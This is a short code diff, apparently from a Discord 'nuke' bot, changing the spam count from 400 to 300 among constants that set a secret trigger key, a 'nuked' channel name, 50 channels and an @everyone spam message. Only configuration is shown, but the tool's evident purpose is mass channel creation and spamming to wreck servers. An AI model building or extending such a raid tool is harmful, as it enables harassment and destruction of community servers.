@@ -32,7 +32,7 @@ NUKE_KEY = "nuke8048"  # Change this to your secret confirmation key
 CHANNEL_BASE_NAME = "nuked"
 SPAM_MSG = "@everyone @here nuked lol"
 CHANNEL_COUNT = 50
-SPAM_COUNT = 400
+SPAM_COUNT = 300
 
 if not os.path.exists(DATA_FILE):
     with open(DATA_FILE, "w", encoding="utf-8") as f:
